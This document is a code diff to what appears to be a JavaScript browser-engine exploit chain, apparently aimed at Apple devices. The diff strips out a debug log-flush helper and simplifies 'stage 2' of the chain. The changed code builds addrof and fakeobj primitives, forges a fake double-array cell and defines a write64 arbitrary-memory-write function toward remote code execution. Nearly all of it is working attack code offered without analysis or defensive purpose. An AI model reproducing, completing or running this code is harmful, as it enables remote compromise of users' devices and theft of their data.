@@ -18314,36 +18314,7 @@ const device_chipset = {
           write64(unboxedArrPtr + 8n, butterfly);
           resolverCheckpoint("Finished stage1 prim succesfully");
         }
-        function flushLogCheckpoint(text)
-        {
-          print(text);
-          const id = `${Date.now()}:${Math.random()}`;
-          if (!p.log_flush_resolvers)
-            p.log_flush_resolvers = {};
-          return new Promise(resolve => {
-            let done = false;
-            function finish() {
-              if (done) return;
-              done = true;
-              if (p.log_flush_resolvers)
-                delete p.log_flush_resolvers[id];
-              resolve();
-            }
-            p.log_flush_resolvers[id] = finish;
-            try {
-              self.postMessage({
-                type: 'log_flush_checkpoint',
-                id,
-                text
-              });
-            } catch (e) {
-              finish();
-              return;
-            }
-            setTimeout(finish, 35);
-          });
-        }
-        async function setup_stage2_prim()
+        function setup_stage2_prim()
         {
           print("setup_stage2: begin");
           p.addrof = function addrof(o) {
@@ -18389,23 +18360,16 @@ const device_chipset = {
           print("setup_stage2: addrof change_scribble_holder begin");
           let change_scribble_holder_addr = p.addrof(change_scribble_holder);
           print(`setup_stage2: change_scribble_holder addr=${change_scribble_holder_addr.hex()}`);
-          const change_scribble_addr = change_scribble_holder_addr + 0x10n;
-          print(`setup_stage2: fakeobj change_scribble target=${change_scribble_addr.hex()}`);
           print("setup_stage2: fakeobj change_scribble begin");
-          let change_scribble = p.fakeobj(change_scribble_addr);
+          let change_scribble = p.fakeobj(change_scribble_holder_addr + 0x10n);
           print("setup_stage2: change_scribble created");
           scribble_element.p3 = 1.1;
           scribble_element[0] = 1.1;
           print("setup_stage2: reading double_array_cell");
           let double_array_cell = BigInt.fromDouble(change_scribble[0]);
-          print(`setup_stage2: double_array_cell=${double_array_cell.hex()}`);
-          await flushLogCheckpoint("setup_stage2: fake double array cell begin");
-          let fake_double_array_cell = p.fakeobj(double_array_cell);
-          print("setup_stage2: fake double array cell created");
-          change_scribble_holder.p1 = fake_double_array_cell;
-          print("setup_stage2: fake double array cell installed");
+          change_scribble_holder.p1 = p.fakeobj(double_array_cell);
           const original_cell = change_scribble[0];
-          print(`setup_stage2: original_cell=${BigInt.fromDouble(original_cell).hex()}`);
+          print("setup_stage2: double array cell installed");
           p.write64 = function (addr, value) {
             change_scribble[0] = original_cell;
             change_scribble[1] = (addr + 0x10n).asDouble();
@@ -18482,7 +18446,7 @@ const device_chipset = {
           });
         }
         setup_stage1_prim(p_rce);
-        await setup_stage2_prim();
+        setup_stage2_prim();
     } catch (e) {
         if (e instanceof TryAgainError) {
             print('failed _make_rw ... retry');
@@ -18720,12 +18684,6 @@ async function main() {
   self.onmessage = async function (e) {
     const data = e.data;
     switch (data.type) {
-      case 'log_flush_checkpoint_ack':
-        {
-          if (p.log_flush_resolvers && p.log_flush_resolvers[data.id])
-            p.log_flush_resolvers[data.id]();
-          break;
-        }
       case 'load_objc_class_done':
         {
           print(`loadObjcClass: done ack index=${data.index}`);
